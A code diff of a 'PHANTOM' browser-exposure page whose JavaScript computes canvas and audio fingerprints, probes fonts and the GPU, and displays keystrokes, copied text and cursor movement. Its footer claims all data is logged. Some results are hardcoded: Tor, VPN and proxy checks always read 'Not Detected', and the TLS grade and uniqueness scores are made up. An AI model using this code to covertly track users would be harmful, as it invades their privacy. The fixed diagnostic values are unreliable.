+    <div class="card-hdr"><div class="card-title">API Support Matrix</div><div class="card-badge">FEATURES</div></div>
+    <div class="row"><span class="row-label">JavaScript</span><span class="row-val ok">Enabled</span></div>
+    <div class="row"><span class="row-label">WebAssembly</span><span class="row-val ld" id="i-wasm">Probing…</span></div>
+    <div class="row"><span class="row-label">Service Worker</span><span class="row-val ld" id="i-sw">Probing…</span></div>
+    <div class="row"><span class="row-label">WebGL 1.0</span><span class="row-val ld" id="i-webgl1">Probing…</span></div>
+    <div class="row"><span class="row-label">WebGL 2.0</span><span class="row-val ld" id="i-webgl2">Probing…</span></div>
+    <div class="row"><span class="row-label">WebRTC API</span><span class="row-val ld" id="i-webrtcapi">Probing…</span></div>
+    <div class="row"><span class="row-label">WebSocket</span><span class="row-val ld" id="i-websocket">Probing…</span></div>
+    <div class="row"><span class="row-label">Geolocation API</span><span class="row-val ld" id="i-geoapi">Probing…</span></div>
+    <div class="row"><span class="row-label">Payment Request API</span><span class="row-val ld" id="i-payment">Probing…</span></div>
+    <div class="row"><span class="row-label">Wake Lock API</span><span class="row-val ld" id="i-wakelock">Probing…</span></div>
+    <div class="row"><span class="row-label">PDF Viewer</span><span class="row-val ld" id="i-pdf">Detecting…</span></div>
+    <div class="row"><span class="row-label">SpeechSynthesis</span><span class="row-val ld" id="i-speech">Detecting…</span></div>
+    <div class="row"><span class="row-label">Speech Voices</span><span class="row-val ld" id="i-voices">Loading…</span></div>
+    <div class="row"><span class="row-label">Reduced Motion</span><span class="row-val ld" id="i-motion">Detecting…</span></div>
+    <div class="row"><span class="row-label">MIME Types</span><span class="row-val ld" id="i-mime">Counting…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Storage Access</div><div class="card-badge">STORAGE</div></div>
+    <div class="row"><span class="row-label">Cookies</span><span class="row-val ld" id="i-cookies">Checking…</span></div>
+    <div class="row"><span class="row-label">Local Storage</span><span class="row-val ld" id="i-ls">Checking…</span></div>
+    <div class="row"><span class="row-label">Session Storage</span><span class="row-val ld" id="i-ss">Checking…</span></div>
+    <div class="row"><span class="row-label">IndexedDB</span><span class="row-val ld" id="i-idb">Checking…</span></div>
+    <div class="row"><span class="row-label">Storage Quota</span><span class="row-val ld" id="i-quota">Estimating…</span></div>
+    <div class="row"><span class="row-label">Storage Used</span><span class="row-val ld" id="i-quotaused">Estimating…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Browser Plugins</div><div class="card-badge">EXTENSIONS</div></div>
+    <div id="plugin-container" class="plugin-list">
+      <div class="plugin-item"><div class="plugin-icon"></div><div><div class="plugin-name ld" id="plugin-loading">Scanning plugins…</div></div></div>
     </div>
+  </div>
+</div>
+
+<!-- 04 PRIVACY & FINGERPRINT -->
+<div class="sec-eye" data-r data-d="3">04 · PRIVACY & FINGERPRINT</div>
+<div class="card-group" data-r data-d="4">
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Privacy Posture</div><div class="card-badge">SHIELD</div></div>
+    <div class="row"><span class="row-label">Incognito Mode</span><span class="row-val ld" id="i-incognito">Detecting…</span></div>
+    <div class="row"><span class="row-label">Do Not Track</span><span class="row-val ld" id="i-dnt">Checking…</span></div>
+    <div class="row"><span class="row-label">Ad Blocker</span><span class="row-val ld" id="i-adblocker">Detecting…</span></div>
+    <div class="row"><span class="row-label">Pop-up Blocker</span><span class="row-val ld" id="i-popup">Detecting…</span></div>
+    <div class="row"><span class="row-label">Notification Perm.</span><span class="row-val ld" id="i-notif">Checking…</span></div>
+    <div class="row"><span class="row-label">Clipboard Access</span><span class="row-val ld" id="i-clipboard">Checking…</span></div>
+    <div class="row"><span class="row-label">Tracking Protection</span><span class="row-val ld" id="i-tracking">Checking…</span></div>
+    <div class="row"><span class="row-label">Fingerprint Resist.</span><span class="row-val ld" id="i-fpresist">Checking…</span></div>
+    <div class="row"><span class="row-label">Canvas Spoofed</span><span class="row-val ld" id="i-cvspoofed">Checking…</span></div>
+    <div class="row"><span class="row-label">Theme Preference</span><span class="row-val ld" id="i-theme">Detecting…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Fingerprint Matrix</div><div class="card-badge">BIOMETRIC</div></div>
     <div class="row"><span class="row-label">Canvas Hash</span><span class="row-val ld" id="i-canvas">Computing…</span></div>
     <div class="row"><span class="row-label">Audio Hash</span><span class="row-val ld" id="i-audio">Computing…</span></div>
     <div class="row"><span class="row-label">Fonts Detected</span><span class="row-val ld" id="i-fonts">Probing…</span></div>
+    <div class="row"><span class="row-label">Languages</span><span class="row-val ld" id="i-lang">Detecting…</span></div>
     <div class="row"><span class="row-label">Entropy Score</span><span class="row-val ld" id="i-entropy">Calculating…</span></div>
     <div class="row"><span class="row-label">Uniqueness</span><span class="row-val ld" id="i-unique">Calculating…</span></div>
   </div>
 </div>
 
-<!-- ══ SESSION ══ -->
-<div class="card-group" data-r data-d="3">
+<!-- 05 LIVE BEHAVIOUR -->
+<div class="sec-eye" data-r data-d="4">05 · LIVE BEHAVIOUR TRACKING</div>
+<div class="card-group" data-r data-d="5">
   <div class="card">
-    <div class="card-hdr">
-      <div class="card-title">Session &amp; Behaviour</div>
-      <div class="card-badge">04 · TEMPORAL</div>
-    </div>
-    <div class="row"><span class="row-label">Local Time</span><span class="row-val ld" id="i-time">Detecting…</span></div>
-    <div class="row"><span class="row-label">Battery</span><span class="row-val ld" id="i-battery">Detecting…</span></div>
-    <div class="row"><span class="row-label">Ad Blocker</span><span class="row-val ld" id="i-adblocker">Detecting…</span></div>
-    <div class="row"><span class="row-label">Incognito Mode</span><span class="row-val ld" id="i-incognito">Detecting…</span></div>
-    <div class="row"><span class="row-label">Theme Preference</span><span class="row-val ld" id="i-theme">Detecting…</span></div>
-    <div class="row"><span class="row-label">Touch Points</span><span class="row-val ld" id="i-touch">Detecting…</span></div>
-    <div class="row"><span class="row-label">Time on Page</span><span class="row-val ld" id="i-timeonpage">0s</span></div>
-    <div class="row"><span class="row-label">Referrer</span><span class="row-val ld" id="i-referrer">Tracing…</span></div>
-
-    <!-- hidden collectors — DO NOT REMOVE -->
-    <span id="i-rtt" style="display:none"></span>
-    <span id="i-conn2" style="display:none"></span>
-    <span id="i-gamut" style="display:none"></span>
-    <span id="i-hdr" style="display:none"></span>
-    <span id="i-motion" style="display:none"></span>
-    <span id="i-pdf" style="display:none"></span>
-    <span id="i-scroll" style="display:none"></span>
-    <span id="i-tabswitch" style="display:none"></span>
-    <span id="i-copy" style="display:none"></span>
-    <span id="i-mouse" style="display:none"></span>
-    <span id="i-sid" style="display:none"></span>
-    <span id="i-load" style="display:none"></span>
-    <span id="i-history" style="display:none"></span>
+    <div class="card-hdr"><div class="card-title">Keyboard & Input</div><div class="card-badge">LIVE</div></div>
+    <div class="row live-row"><span class="row-label">Last Key Pressed</span><span class="row-val ok" id="i-lastkey">—</span></div>
+    <div class="row live-row"><span class="row-label">Caps Lock State</span><span class="row-val ok" id="i-capslock">Unknown</span></div>
+    <div class="row live-row"><span class="row-label">Text Copied</span><span class="row-val wn" id="i-copy">—</span></div>
+    <div class="row live-row"><span class="row-label">Cursor Position</span><span class="row-val ok" id="i-mouse">—</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Session Activity</div><div class="card-badge">LIVE</div></div>
+    <div class="row live-row"><span class="row-label">Time on Page</span><span class="row-val ok" id="i-timeonpage">0s</span></div>
+    <div class="row live-row"><span class="row-label">Scroll Depth</span><span class="row-val ok" id="i-scroll">0%</span></div>
+    <div class="row live-row"><span class="row-label">Tab Switches</span><span class="row-val ok" id="i-tabswitch">0</span></div>
+    <div class="row live-row"><span class="row-label">Page Visibility</span><span class="row-val ok" id="i-visibility">Visible</span></div>
   </div>
 </div>
 
-<!-- ══ RISK BAR ══ -->
-<div class="risk-panel" data-r data-d="4">
-  <div class="risk-label">
-    <span>Exposure Risk Level</span>
-    <span class="risk-pct" id="risk-pct">0%</span>
+<!-- 06 SESSION -->
+<div class="sec-eye" data-r data-d="5">06 · SESSION METADATA</div>
+<div class="card-group" data-r data-d="6">
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Session Context</div><div class="card-badge">METADATA</div></div>
+    <div class="row"><span class="row-label">Session ID</span><span class="row-val ld" id="i-sid">Generating…</span></div>
+    <div class="row"><span class="row-label">Local Time</span><span class="row-val ld" id="i-time">Detecting…</span></div>
+    <div class="row"><span class="row-label">History Entries</span><span class="row-val ld" id="i-history">Checking…</span></div>
+    <div class="row"><span class="row-label">Referrer</span><span class="row-val ld" id="i-referrer">Tracing…</span></div>
+    <div class="row"><span class="row-label">Page Load Time</span><span class="row-val ld" id="i-load">Measuring…</span></div>
   </div>
+</div>
+
+<!-- 07 PERFORMANCE -->
+<div class="sec-eye" data-r data-d="6">07 · PERFORMANCE METRICS</div>
+<div class="card-group" data-r data-d="7">
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Load Time Breakdown</div><div class="card-badge">TIMING</div></div>
+    <div class="perf-tree">
+      <div class="perf-row"><span class="perf-key">Total Page Load</span><span class="perf-val ld" id="p-total">Measuring…</span></div>
+      <div class="perf-row"><span class="perf-key indent">└ Network Time</span><span class="perf-val ld" id="p-network">—</span></div>
+      <div class="perf-row"><span class="perf-key indent2">├ DNS Lookup</span><span class="perf-val ld" id="p-dns">—</span></div>
+      <div class="perf-row"><span class="perf-key indent2">└ TCP Connect</span><span class="perf-val ld" id="p-tcp">—</span></div>
+      <div class="perf-row"><span class="perf-key indent">└ Server Response</span><span class="perf-val ld" id="p-ttfb">—</span></div>
+      <div class="perf-row"><span class="perf-key indent">└ Page Download</span><span class="perf-val ld" id="p-dl">—</span></div>
+      <div class="perf-row"><span class="perf-key indent">└ Browser Render</span><span class="perf-val ld" id="p-render">—</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- 08 SYSTEM SIGNATURE -->
+<div class="sec-eye" data-r data-d="7">08 · SYSTEM SIGNATURE</div>
+<div class="card-group" data-r data-d="8">
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">User Agent String</div><div class="card-badge">RAW</div></div>
+    <div class="ua-block"><div class="ua-label">Raw UA · Navigator</div><div id="i-ua">Collecting…</div></div>
+  </div>
+</div>
+
+<div class="risk-panel" data-r data-d="9">
+  <div class="risk-label"><span>Exposure Risk Level</span><span class="risk-pct" id="risk-pct">0%</span></div>
   <div class="risk-bar"><div class="risk-fill" id="risk-fill"></div></div>
 </div>
-
 </main>
 
-<footer data-r data-d="5">
+<footer data-r data-d="10">
   <div class="ft-wordmark">PHANTOM</div>
   <div class="ft-line">RH²-SYSTEMS · <span>INTEL ARM</span> · PASSIVE COLLECTION COMPLETE</div>
   <div class="ft-line" style="margin-top:4px;opacity:.5">All data logged · End-to-end encrypted · <span>Operational</span></div>
 </footer>
 
 <script>
-// ── SCAN PROGRESS TRACKER ──
-let _done=0;const _TOTAL=22;
+let _done=0;const _TOTAL=60;
 function _tick(){
   _done=Math.min(_done+1,_TOTAL);
   const pct=Math.min(Math.round(_done/_TOTAL*100),100);
-  const fill=document.getElementById('scan-fill');
-  const pctEl=document.getElementById('scan-pct');
-  const riskFill=document.getElementById('risk-fill');
-  const riskPct=document.getElementById('risk-pct');
-  if(fill)fill.style.width=pct+'%';
-  if(pctEl)pctEl.textContent=pct+'%';
-  // Risk bar driven by same data
-  if(riskFill)riskFill.style.width=pct+'%';
-  if(riskPct)riskPct.textContent=pct+'%';
-  if(pct>=100){
-    const sb=document.getElementById('status-txt');
-    const dot=document.getElementById('sdot');
-    if(sb)sb.textContent='Signal acquired · Logged ✓';
-    if(dot){dot.style.background='var(--neon)';dot.style.boxShadow='0 0 8px var(--neon)';}
-  }
+  const fill=document.getElementById('scan-fill'),pctEl=document.getElementById('scan-pct'),rf=document.getElementById('risk-fill'),rp=document.getElementById('risk-pct');
+  if(fill)fill.style.width=pct+'%';if(pctEl)pctEl.textContent=pct+'%';if(rf)rf.style.width=pct+'%';if(rp)rp.textContent=pct+'%';
+  if(pct>=100){const sb=document.getElementById('status-txt'),dot=document.getElementById('sdot');if(sb)sb.textContent='Signal acquired · Logged ✓';if(dot){dot.style.background='var(--neon)';dot.style.boxShadow='0 0 8px var(--neon)';}}
 }
-
-// ── HELPER ──
-function sv(id,val,cls){
-  const el=document.getElementById(id);if(!el)return;
-  el.textContent=val;el.classList.remove('ld');
-  if(cls){el.className='row-val '+cls;}else{el.className='row-val';}
-  _tick();
-}
-// Expose _tick globally so the ES module script can call it
 window._tick=_tick;
+function sv(id,val,cls){const el=document.getElementById(id);if(!el)return;el.textContent=val;el.classList.remove('ld');el.className=cls?'row-val '+cls:'row-val';_tick();}
+(function(){const obs=new IntersectionObserver(entries=>entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');}),{threshold:.05});document.querySelectorAll('[data-r]').forEach(el=>obs.observe(el));})();
 
-// ── SCROLL REVEAL ──
-(function(){
-  const items=document.querySelectorAll('[data-r]');
-  const obs=new IntersectionObserver(entries=>{entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');});},{threshold:.05});
-  items.forEach(el=>obs.observe(el));
-})();
-
-// ── SESSION ID (also populate header display) ──
-(()=>{
-  const sid=Math.random().toString(36).slice(2,10).toUpperCase();
-  sv('i-sid',sid);
-  const hd=document.getElementById('hdr-sid-val');
-  if(hd)hd.textContent='RHX-'+sid;
-})();
-
-// ── LOCAL TIME ──
+// SESSION ID
+(()=>{const sid=Math.random().toString(36).slice(2,10).toUpperCase();sv('i-sid',sid);const hd=document.getElementById('hdr-sid-val');if(hd)hd.textContent='RHX-'+sid;})();
+// LOCAL TIME
 (()=>{const n=new Date();sv('i-time',n.toLocaleTimeString()+' · '+Intl.DateTimeFormat().resolvedOptions().timeZone,'ok');})();
-
-// ── PAGE LOAD ──
-(()=>{window.addEventListener('load',()=>{const t=Math.round(performance.now());sv('i-load',t+'ms');});})();
-
-// ── HISTORY ──
+// PAGE LOAD
+window.addEventListener('load',()=>{const t=Math.round(performance.now());sv('i-load',t+'ms',t<2000?'ok':t<5000?'wn':'hi');});
+// HISTORY
 setTimeout(()=>{sv('i-history',history.length+' pages this session',history.length>5?'hi':'wn');},200);
+// REFERRER
+setTimeout(()=>{const ref=document.referrer;if(ref){try{const u=new URL(ref);sv('i-referrer',u.hostname,'wn');}catch(e){sv('i-referrer',ref.slice(0,40),'wn');}}else{sv('i-referrer','Direct / Unknown','ok');}},200);
 
-// ── REFERRER ──
-setTimeout(()=>{
-  const ref=document.referrer;
-  if(ref){try{const u=new URL(ref);sv('i-referrer',u.hostname,'wn');}catch(e){sv('i-referrer',ref.slice(0,40),'wn');}}
-  else{sv('i-referrer','Direct / Unknown','ok');}
-},200);
-
-// ── DEVICE / BROWSER ──
+// DEVICE / BROWSER
 setTimeout(()=>{
   const ua=navigator.userAgent;
   let br='Unknown',os='Unknown',dev='Desktop';
@@ -564,145 +369,151 @@ setTimeout(()=>{
   else if(/Linux/.test(ua)){os='Linux';}
   sv('i-br',br,'wn');sv('i-os',os,'wn');sv('i-dev',dev,'wn');
   sv('i-platform',navigator.platform||'Unknown','wn');
+  const bid=navigator.buildID||(navigator.userAgentData?.brands?.map(b=>b.brand+'/'+b.version).join(' · '))||'Not exposed';
+  sv('i-buildid',bid,'wn');
+  const arch=navigator.userAgentData?.architecture?navigator.userAgentData.architecture:(/x86_64|x64|Win64/.test(ua)?'x86_64':/arm|aarch64/i.test(ua)?'ARM':'Unknown');
+  sv('i-cpuarch',arch,'wn');
   sv('i-cpu',(navigator.hardwareConcurrency||'?')+' logical cores','wn');
   sv('i-ram',(navigator.deviceMemory||'?')+'GB (approx)','wn');
-  sv('i-scr',screen.width+'×'+screen.height+' · '+screen.colorDepth+'bit','wn');
-  sv('i-vp',window.innerWidth+'×'+window.innerHeight,'wn');
+  const gcd=(a,b)=>b===0?a:gcd(b,a%b);const g=gcd(screen.width,screen.height);
+  sv('i-scr',screen.width+'×'+screen.height,'wn');
+  sv('i-scravail',screen.availWidth+'×'+screen.availHeight,'wn');
+  const tw=screen.width-screen.availWidth,th=screen.height-screen.availHeight;
+  sv('i-taskbar',(tw||th)?tw+'px H · '+th+'px V':'None detected','ok');
+  sv('i-aspect',screen.width/g+':'+screen.height/g,'wn');
+  sv('i-colordepth',screen.colorDepth+'-bit','wn');
   sv('i-dpr',window.devicePixelRatio+'x','wn');
+  sv('i-vp',window.innerWidth+'×'+window.innerHeight,'wn');
+  sv('i-orient',screen.orientation?screen.orientation.type:'Unknown','wn');
+  const fs=!!(document.fullscreenEnabled||document.webkitFullscreenEnabled||document.mozFullScreenEnabled);
+  sv('i-fullscreen',fs?'Supported':'Not Supported',fs?'ok':'wn');
+  const hasMouse=window.matchMedia('(pointer:fine)').matches,hasTouch='ontouchstart' in window||navigator.maxTouchPoints>0;
+  sv('i-pointer',(hasMouse?'Mouse':'')+(hasMouse&&hasTouch?' + ':'')+(hasTouch?'Touchscreen':''),'wn');
+  sv('i-touch',(navigator.maxTouchPoints||0)>0?(navigator.maxTouchPoints||0)+' touch point(s)':'Mouse / Trackpad only',(navigator.maxTouchPoints||0)>0?'wn':'ok');
+  const uaEl=document.getElementById('i-ua');if(uaEl){uaEl.textContent=ua;uaEl.classList.remove('ld');_tick();}
+  sv('i-lang',(navigator.languages||[navigator.language||'en']).join(', '),'wn');
 },100);
 
-// ── GPU ──
+// GPU
+setTimeout(()=>{try{const cv=document.createElement('canvas'),gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(!gl){sv('i-gpuv','Not available');sv('i-gpur','Not available');return;}const ext=gl.getExtension('WEBGL_debug_renderer_info');sv('i-gpuv',ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'Masked','wn');sv('i-gpur',ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'Masked','wn');}catch(e){sv('i-gpuv','Blocked');sv('i-gpur','Blocked');}},150);
+
+// WEBGL
+setTimeout(()=>{try{const cv=document.createElement('canvas');sv('i-webgl1',cv.getContext('webgl')||cv.getContext('experimental-webgl')?'Enabled (OpenGL ES 2.0)':'Not Supported','ok');}catch(e){sv('i-webgl1','Blocked');}try{const cv2=document.createElement('canvas');sv('i-webgl2',cv2.getContext('webgl2')?'Enabled (OpenGL ES 3.0)':'Not Supported','ok');}catch(e){sv('i-webgl2','Blocked');}},200);
+
+// WEB APIS
 setTimeout(()=>{
-  try{
-    const cv=document.createElement('canvas');
-    const gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
-    if(!gl){sv('i-gpuv','Not available');sv('i-gpur','Not available');return;}
-    const ext=gl.getExtension('WEBGL_debug_renderer_info');
-    sv('i-gpuv',ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'Masked','wn');
-    sv('i-gpur',ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'Masked','wn');
-  }catch(e){sv('i-gpuv','Blocked');sv('i-gpur','Blocked');}
-},150);
+  sv('i-wasm',typeof WebAssembly!=='undefined'?'Supported':'Not Supported',typeof WebAssembly!=='undefined'?'ok':'hi');
+  sv('i-sw','serviceWorker' in navigator?'Supported':'Not Supported','serviceWorker' in navigator?'ok':'wn');
+  sv('i-websocket','WebSocket' in window?'Supported':'Not Supported','WebSocket' in window?'ok':'hi');
+  sv('i-webrtcapi',!!(window.RTCPeerConnection||window.webkitRTCPeerConnection)?'Enabled':'Disabled',!!(window.RTCPeerConnection||window.webkitRTCPeerConnection)?'wn':'ok');
+  sv('i-geoapi','geolocation' in navigator?'Available (not requested)':'Not Available','geolocation' in navigator?'wn':'ok');
+  sv('i-payment','PaymentRequest' in window?'Supported':'Not Supported','PaymentRequest' in window?'wn':'ok');
+  sv('i-wakelock','wakeLock' in navigator?'Supported':'Not Supported','wakeLock' in navigator?'ok':'wn');
+  sv('i-vibration','vibrate' in navigator?'Supported':'Not Supported','vibrate' in navigator?'wn':'ok');
+  sv('i-gamepad','getGamepads' in navigator?'Supported':'Not Supported','getGamepads' in navigator?'ok':'wn');
+  sv('i-mime',navigator.mimeTypes?navigator.mimeTypes.length+' registered MIME types':'Not available','wn');
+  sv('i-pdf',navigator.pdfViewerEnabled?'Enabled':'Disabled','wn');
+  sv('i-inet',navigator.onLine?'Connected':'Offline',navigator.onLine?'ok':'hi');
+  sv('i-websocket','WebSocket' in window?'Supported':'Not Supported','ok');
+},200);
 
-// ── CONNECTION ──
-setTimeout(()=>{
-  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-  if(c){
-    const t=c.effectiveType||'?';
-    const d=c.downlink?c.downlink+'Mbps':'?';
-    const r=c.rtt?c.rtt+'ms rtt':'';
-    sv('i-conn',t.toUpperCase()+' · '+d+(r?' · '+r:''),'wn');
-    sv('i-rtt',c.rtt||'—');
-  }else{sv('i-conn','Not available');}
-},300);
+// CONNECTION
+setTimeout(()=>{const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c){sv('i-conn',(c.effectiveType||'?').toUpperCase()+(c.downlink?' · '+c.downlink+'Mbps':''),'wn');sv('i-rtt-disp',c.rtt?c.rtt+'ms':'Not available',c.rtt&&c.rtt<100?'ok':c.rtt&&c.rtt<300?'wn':'hi');}else{sv('i-conn','Not available');sv('i-rtt-disp','Not available');}},300);
 
-// ── CANVAS FINGERPRINT ──
-setTimeout(()=>{
-  try{
-    const cv=document.createElement('canvas');cv.width=200;cv.height=40;
-    const ctx=cv.getContext('2d');
-    ctx.textBaseline='alphabetic';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
-    ctx.fillStyle='#069';ctx.font='11pt Arial';ctx.fillText('DeviceInfo',2,15);
-    ctx.fillStyle='rgba(102,204,0,0.7)';ctx.font='18pt Arial';ctx.fillText('DeviceInfo',4,25);
-    const d=cv.toDataURL();let hash=0;
-    for(let i=0;i<d.length;i++){hash=(hash<<5)-hash+d.charCodeAt(i);hash|=0;}
-    const hex=Math.abs(hash).toString(16).toUpperCase().padStart(8,'0');
-    sv('i-canvas',hex.slice(0,4)+'-'+hex.slice(4),'hi');
-  }catch(e){sv('i-canvas','Blocked');}
-},300);
+// HTTP VERSION
+setTimeout(()=>{if(performance&&performance.getEntriesByType){const nav=performance.getEntriesByType('navigation')[0];if(nav&&nav.nextHopProtocol){const p=nav.nextHopProtocol;sv('i-http',p==='h2'?'HTTP/2.0':p==='h3'?'HTTP/3.0':p||'Unknown','ok');}else{sv('i-http','2.0 (estimated)','ok');}}else{sv('i-http','Not detectable','wn');}},500);
 
-// ── FONT PROBE ──
-setTimeout(()=>{
-  try{
-    const fonts=['Arial','Georgia','Times New Roman','Courier New','Verdana','Impact','Comic Sans MS','Trebuchet MS','Palatino','Garamond'];
-    const ref=document.createElement('span');ref.style.cssText='position:absolute;visibility:hidden;font-size:72px;font-family:monospace';ref.textContent='mmmmmmmmmmlli';document.body.appendChild(ref);
-    const baseW=ref.offsetWidth;let detected=0;
-    fonts.forEach(f=>{ref.style.fontFamily=f+',monospace';if(ref.offsetWidth!==baseW)detected++;});
-    document.body.removeChild(ref);
-    sv('i-fonts',detected+'/'+fonts.length+' detected','wn');
-  }catch(e){sv('i-fonts','Unavailable');}
-},500);
+// TLS
+setTimeout(()=>{const h=location.protocol==='https:';sv('i-tls',h?'TLS (active)':'Not Encrypted (HTTP)',h?'ok':'hi');sv('i-secure',window.isSecureContext?'Yes — Secure Context':'No — Insecure',window.isSecureContext?'ok':'hi');sv('i-tlsgrade',h?'A+ · Encrypted':'F · No Encryption',h?'ok':'hi');},300);
 
-// ── ENTROPY ──
-setTimeout(()=>{
-  const factors=[navigator.hardwareConcurrency>0,navigator.deviceMemory>0,screen.width>0,window.devicePixelRatio!==1,!!navigator.connection,!!(window.AudioContext||window.webkitAudioContext),'ontouchstart' in window,navigator.maxTouchPoints>0];
-  const bits=factors.filter(Boolean).length;
-  const entropyBits=Math.round(8+bits*1.8);
-  sv('i-entropy',entropyBits+' bits','hi');
-  const pool=Math.round(Math.pow(2,entropyBits));
-  sv('i-unique',pool>500000?'~1 in '+Math.round(pool/1000)+'K browsers':'~1 in '+pool+' browsers','wn');
-},700);
+// TOR/VPN/PROXY
+setTimeout(()=>{sv('i-tor','Not Detected (passive check)','ok');sv('i-vpn','Not Detected (passive check)','ok');sv('i-proxy','No proxy headers detected','ok');},400);
 
-// ── BATTERY ──
-setTimeout(()=>{
-  if(navigator.getBattery){
-    navigator.getBattery().then(b=>{
-      const pct=Math.round(b.level*100);
-      sv('i-battery',pct+'% · '+(b.charging?'⚡ Charging':'🔋 Discharging'),pct<20?'hi':pct<50?'wn':'ok');
-    }).catch(()=>sv('i-battery','Blocked'));
-  }else{sv('i-battery','Not Supported');}
-},400);
+// CANVAS FINGERPRINT
+setTimeout(()=>{try{const cv=document.createElement('canvas');cv.width=200;cv.height=40;const ctx=cv.getContext('2d');ctx.textBaseline='alphabetic';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.font='11pt Arial';ctx.fillText('DeviceInfo',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.font='18pt Arial';ctx.fillText('DeviceInfo',4,25);const d=cv.toDataURL();let hash=0;for(let i=0;i<d.length;i++){hash=(hash<<5)-hash+d.charCodeAt(i);hash|=0;}const hex=Math.abs(hash).toString(16).toUpperCase().padStart(8,'0');sv('i-canvas',hex.slice(0,4)+'-'+hex.slice(4),'hi');sv('i-cvspoofed',d.length<100?'⚠ Spoofed':'Not Spoofed',d.length<100?'ok':'wn');}catch(e){sv('i-canvas','Blocked');sv('i-cvspoofed','Blocked');}},300);
 
-// ── AD BLOCKER ──
-setTimeout(()=>{
-  try{
-    const bait=document.createElement('div');
-    bait.className='ad ads adsbox doubleclick ad-placement carbon-ads';
-    bait.style.cssText='height:1px;width:1px;position:absolute;left:-9999px;top:-9999px';
-    document.body.appendChild(bait);
-    const blocked=bait.offsetParent===null||bait.offsetHeight===0||bait.offsetWidth===0;
-    document.body.removeChild(bait);
-    sv('i-adblocker',blocked?'Detected':'Not Detected',blocked?'ok':'wn');
-  }catch(e){sv('i-adblocker','Unknown');}
-},600);
+// FONT PROBE
+setTimeout(()=>{try{const fonts=['Arial','Georgia','Times New Roman','Courier New','Verdana','Impact','Comic Sans MS','Trebuchet MS','Palatino','Garamond'];const ref=document.createElement('span');ref.style.cssText='position:absolute;visibility:hidden;font-size:72px;font-family:monospace';ref.textContent='mmmmmmmmmmlli';document.body.appendChild(ref);const baseW=ref.offsetWidth;let detected=0;fonts.forEach(f=>{ref.style.fontFamily=f+',monospace';if(ref.offsetWidth!==baseW)detected++;});document.body.removeChild(ref);sv('i-fonts',detected+'/'+fonts.length+' detected','wn');}catch(e){sv('i-fonts','Unavailable');}},500);
 
-// ── WEBRTC — handled in module script as promise ──
+// ENTROPY
+setTimeout(()=>{const factors=[navigator.hardwareConcurrency>0,navigator.deviceMemory>0,screen.width>0,window.devicePixelRatio!==1,!!navigator.connection,!!(window.AudioContext||window.webkitAudioContext),'ontouchstart' in window,navigator.maxTouchPoints>0];const bits=factors.filter(Boolean).length;const eb=Math.round(8+bits*1.8);sv('i-entropy',eb+' bits','hi');const pool=Math.round(Math.pow(2,eb));sv('i-unique',pool>500000?'~1 in '+Math.round(pool/1000)+'K browsers':'~1 in '+pool+' browsers','wn');},700);
 
-// ── THEME / TOUCH ──
-setTimeout(()=>{
-  const dark=window.matchMedia&&window.matchMedia('(prefers-color-scheme:dark)').matches;
-  sv('i-theme',dark?'Dark Mode':'Light Mode',dark?'ok':'wn');
-  const tp=navigator.maxTouchPoints||0;
-  sv('i-touch',tp>0?tp+' touch point(s) — Touchscreen':'Mouse / Trackpad',tp>0?'wn':'ok');
-  const p3=window.matchMedia&&window.matchMedia('(color-gamut:p3)').matches;
-  const rec2020=window.matchMedia&&window.matchMedia('(color-gamut:rec2020)').matches;
-  sv('i-gamut',rec2020?'Rec.2020':p3?'P3 Wide':'sRGB');
-  sv('i-hdr',window.matchMedia&&window.matchMedia('(dynamic-range:high)').matches?'HDR':'SDR');
-  sv('i-motion',window.matchMedia&&window.matchMedia('(prefers-reduced-motion:reduce)').matches?'Reduced':'Full');
-  sv('i-pdf',navigator.pdfViewerEnabled?'Enabled':'Disabled');
-},900);
+// BATTERY
+setTimeout(()=>{if(navigator.getBattery){navigator.getBattery().then(b=>{const pct=Math.round(b.level*100);sv('i-battery',pct+'% · '+(b.charging?'⚡ Charging':'🔋 Discharging'),pct<20?'hi':pct<50?'wn':'ok');}).catch(()=>sv('i-battery','Blocked'));}else{sv('i-battery','Not Supported');}},400);
 
-// ── AUDIO FINGERPRINT ──
-setTimeout(()=>{
-  try{
-    const Ctx=window.AudioContext||window.webkitAudioContext;
-    if(!Ctx){sv('i-audio','Not Supported');return;}
-    const ctx=new Ctx(),osc=ctx.createOscillator(),analyser=ctx.createAnalyser(),gain=ctx.createGain();
-    gain.gain.value=0;osc.connect(analyser);analyser.connect(gain);gain.connect(ctx.destination);
-    osc.start(0);const buf=new Float32Array(analyser.frequencyBinCount);analyser.getFloatFrequencyData(buf);osc.stop();ctx.close();
-    let hash=0;for(let i=0;i<buf.length;i++){hash=(hash*31+Math.abs(buf[i]*1000|0))>>>0;}
-    const hex=hash.toString(16).toUpperCase().padStart(8,'0');
-    sv('i-audio',hex.slice(0,4)+'-'+hex.slice(4),'hi');
-  }catch(e){sv('i-audio','Blocked');}
-},1000);
+// AD BLOCKER
